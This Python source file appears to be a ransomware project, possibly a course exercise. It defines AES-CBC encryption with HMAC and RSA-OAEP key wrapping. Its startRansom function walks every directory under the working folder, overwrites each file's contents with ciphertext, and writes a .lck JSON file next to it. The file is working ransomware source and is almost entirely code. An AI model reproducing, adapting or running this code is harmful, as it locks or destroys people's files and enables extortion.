import os, base64, constants, rsakeys, json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes, hmac, serialization, asymmetric
# Encrypts a message using a random key generated from the OS
def myEncrypt(message, key):

	if(len(key) < constants.CONST_KEY_BYTES):
		print("Error: key length less than 32 bytes")
		return
		
	# Creates a random string of 16 bytes
	iv = os.urandom(constants.CONST_IV_BYTES)

	# Here we set the parameters for the encryptor
	# We use AES and CBC
	encryptor = Cipher(
				algorithms.AES(key),
				modes.CBC(iv),
				backend = default_backend()
				).encryptor()

	# Encode the message to base64
	encoded = base64.b64encode(message)
	encoded = addPadding(encoded)

	# We encrypt the message
	cipherText = encryptor.update(encoded) + encryptor.finalize()

	return (cipherText, iv)

# Do not use the same key twice
# HMAC key should equal length to the digest_size
def myEncryptMAC(message, enc_key, hmac_key):

	if(len(enc_key) < constants.CONST_KEY_BYTES):
		print("Error: key length less than 32 bytes")
		return
	
	if(len(hmac_key) < constants.CONST_HMACKEY_BYTES):
		print("Error: HMAC Key length less than 32 bytes")
		return

	# Creates a random string of 16 bytes
	iv = os.urandom(constants.CONST_IV_BYTES)


	# Here we set the parameters for the encryptor
	# We use AES and CBC
	encryptor = Cipher(
				algorithms.AES(enc_key),
				modes.CBC(iv),
				backend = default_backend()
				).encryptor()
	

	# Encode the message to base64
	encoded = base64.b64encode(message)
	encoded = addPadding(encoded)

	# We encrypt the message
	cipherText = encryptor.update(encoded) + encryptor.finalize()

	# After we encrypt it, we can make hash-based message authenication codes
	h = hmac.HMAC(hmac_key, hashes.SHA256(), backend = default_backend())
	h.update(cipherText)
	tag = h.finalize()

	return (cipherText, iv, tag)


# Given a file within the same working directory it will encrypt it
def myFileEncrypt(filepath):

	# Checks if file exists
	if(os.path.isfile(filepath)):
	
		# Makes a 32 byte key
		key = os.urandom(constants.CONST_KEY_BYTES)
		
		# Splits the file name and file extension
		fileLabel, fileExt = os.path.splitext(filepath)
		
		# Opens the file to read it as binary
		with open(filepath, "rb") as file:
			file_string = file.read()

			# Encrypts the file_string using the key
			# returns the encrypted file as encoded cipherFile and iv
			cipherFile, iv = myEncrypt(file_string, key)
		
		# Opens the file to overwrite it as binary
		with open(filepath, "wb") as file:

			# Overwrites whatever is inside with the encrypted encoded cipherFile
			file.write(cipherFile)
			file.close()

		return (cipherFile, iv, key, fileExt)


def myFileEncryptMAC(filepath):

	# Checks if file exists
	if(os.path.isfile(filepath)):
	
		# Makes a 32 byte key
		enc_key = os.urandom(constants.CONST_KEY_BYTES)
		hmac_key = os.urandom(constants.CONST_HMACKEY_BYTES)	
		
		# Splits the file name and file extension
		fileLabel, fileExt = os.path.splitext(filepath)
		
		# Opens the file to read it as binary
		with open(filepath, "rb") as file:
			file_string = file.read()

			# Encrypts the file_string using the key
			# returns the encrypted file as encoded cipherFile and iv
			cipherFile, iv = myEncrypt(file_string, enc_key)
		
		# Opens the file to overwrite it as binary
		with open(filepath, "wb") as file:

			# Overwrites whatever is inside with the encrypted encoded cipherFile
			file.write(cipherFile)
			file.close()

		# After we encrypt it, we can make hash-based message authenication codes
		h = hmac.HMAC(hmac_key, hashes.SHA256(), backend = default_backend())
		h.update(cipherFile)
		tag = h.finalize()

		return (cipherFile, iv, tag, enc_key, hmac_key, fileExt)


# RSA Encrypt using AES CBC 256 Encryption with HMAC 
def myRSAEncrypt(filepath, RSA_Publickey_filepath):

	(cipherFile, iv, tag, enc_key, hmac_key, fileExt) = myFileEncryptMAC(filepath)
	
	key = enc_key + hmac_key

	with open(RSA_Publickey_filepath, 'rb') as key_file:
		public_key = serialization.load_pem_public_key(
			key_file.read(),
			backend = default_backend()
			)

		RSACipher = public_key.encrypt(
			key,
			asymmetric.padding.OAEP(
				mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
				algorithm=hashes.SHA256(),
				label=None
				)
			)
		key_file.close()
	return (RSACipher, cipherFile, iv, tag, fileExt) 


def startRansom():
	rsakeys.createDirectory("keys")
	keyFolder = os.path.join(os.getcwd(),"keys")
	rsakeys.createKeyPair(keyFolder)
	privateKeyPath = os.path.join(keyFolder, "private_key")
	publicKeyPath = os.path.join(keyFolder, "public_key")

	for dirName, subDirList, fileList in os.walk(os.getcwd()):
		print('Found directory: %s' % dirName)
		for fileName in fileList:
			print(fileName)
			if(fileName == 'encryption.py' 
						or fileName == 'decryption.py'
						or fileName == 'rsakeys.py'
						or fileName == 'constants.py'
						or fileName == 'private_key'
						or fileName == 'public_key'):
				print('Found: %s' % fileName)

			else:
				file = os.path.join(dirName, fileName)
				(RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(file, publicKeyPath)
				#os.remove(file)
				createJSON(file, RSACipher, cipherFile, iv, tag, fileExt)

# Create a JSON file
def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
	name, ext = os.path.splitext(fileName)
	data = {}
	data['fileName'] = name
	data['RSACipher'] = base64.encodestring(RSACipher).decode('ascii')
	data['cipherFile'] = base64.encodestring(cipherFile).decode('ascii')
	data['iv'] = base64.encodestring(iv).decode('ascii')
	data['tag'] = base64.encodestring(tag).decode('ascii')
	data['fileExt'] = fileExt
	with open(fileName + '.lck', 'w') as file:
		file.write(json.dumps(data, indent=4))
		file.close()
		

# AES requires plain text and ciphertext to be a multiple of 16
# We pad it so that the message is a multiple of the IV, 16
def addPadding(encoded):
	
	# We pad it with 128 bits or 16 bytes
	padder = padding.PKCS7(constants.CONST_PADDING_BITS).padder()

	# update() pads the encoded message
	padded_encoded = padder.update(encoded)

	# .finalize () Returns the remainder of the data.
	padded_encoded += padder.finalize()
	return padded_encoded
